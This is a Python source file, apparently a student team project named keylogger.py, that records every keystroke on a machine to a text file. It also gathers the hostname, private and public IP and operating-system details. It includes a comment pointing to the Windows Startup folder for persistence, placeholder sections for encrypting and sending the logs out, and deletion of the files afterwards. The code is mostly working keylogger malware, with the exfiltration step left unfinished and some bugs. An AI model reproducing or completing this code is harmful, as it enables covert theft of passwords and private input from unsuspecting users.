#Team myKeys
#keylogger.py
#Connor Blaszkiewicz and Neta Shiff

# Libraries Used
import socket
import platform
from pynput.keyboard import Key, Listener
import time
import os
import getpass
from requests import get
import multiprocessing
import gnupg


loggedKeys = "loggedKeys.txt"
systemInfo = "systemInfo.txt"

loggedKeysEncrypted = "loggedKeysEncrypted.txt"
systemInfoEncrypted = "systemInfoEncrypted.txt"

path = "" #"C:\Users\default\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup" will go here eventually?
extend = "\\"
extendedPath = path + extend


### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###
### ESTABLISH HOW/WHERE ENCRYPTED FILES WILL BE SENT HERE ###


### This creates a document that contains useful system information and specifications ###
def getSystemInfo():
    #needs error handling
    with open(extendedPath + systemInfo, "a") as f:
        hostname = socket.gethostname()
        # Writes hostname
        f.write("Hostname: " + hostname + '\n')

        privateIP = socket.gethostbyname(hostname)
        try:
            publicIP = get("https://api.ipify.org").text
            f.write("Public IP address: " + publicIP + '\n')

        except Exception:
            f.write("ERROR: could not retrieve public IP address" + '\n')

        # Writes Private IP
        f.write("private IP address: " + privateIP + '\n')
        # Writes Machine Name
        f.write("Machine: " + platform.machine() + '\n')
        # Writes System Type
        f.write("System: "+ platform.system() + '\n')
        # Writes System Version
        f.write("Version: "+ platform.version() +'\n')
        # Writes Processor
        f.write("Processor: " + platform.processor() + '\n')

getSystemInfo()

### Run Length Variables ###
numberOfLogs = 0
logTime = 15 #This should be changed to 24 hours equivalent (I think)
currentTime = time.time()
endTime = currentTime + logTime #Will result in 24 hours after currentTime


### Establishes how long the program will record keys ###
      ### All Key Recording Processes are below ###
while currentTime < endTime:
    count = 0
    keys = []

    ### When a key is pressed ###
    def onPress(key):
        global keys
        global count
        global currentTime

        print(key)
        keys.append(key)
        count += 1
        currentTime = time.time()

        if count >= 1:
            count = 0
            writeToFile(keys)
            keys = []

    ### Writes keys to file ###
    def writeToFile(keys):
        #needs error handling
        with open(extendedPath + loggedKeys, "a") as f:
            for key in keys:
                k = str(key.replace("'",""))
                if k.find("space") > 0:
                    f.write('\n')
                    f.close()
                elif k.find("Key") == -1:
                    f.write(k)
                    f.close()

    ### When a key is released ###
    def onRelease(key):
        # This may not be needed
        if key == Key.esc:
            return False 
        if currentTime > endTime:
            return False

    with Listener(onPress = onPress, onRelease = onRelease) as listener:
        listener.join()

    if currentTime > endTime:
        #needs error handling
        with open(extendedPath + loggedKeys, "w") as f:
            f.write()
        
        numberOfLogs += 1

        currentTime = time.time()
        endTime = time.time() + logTime

    
### ENCRYPT FILES HERE ###
### ENCRYPT FILES HERE ###
### ENCRYPT FILES HERE ###
### ENCRYPT FILES HERE ###
### ENCRYPT FILES HERE ###
### ENCRYPT FILES HERE ###
### ENCRYPT FILES HERE ###
### ENCRYPT FILES HERE ###
### ENCRYPT FILES HERE ###
### ENCRYPT FILES HERE ###


### Deletes Files After they are Encrypted and Sent ###
deleteFiles = [systemInfo,loggedKeys]
for file in deleteFiles:
    os.remove(extendedPath + file)

            

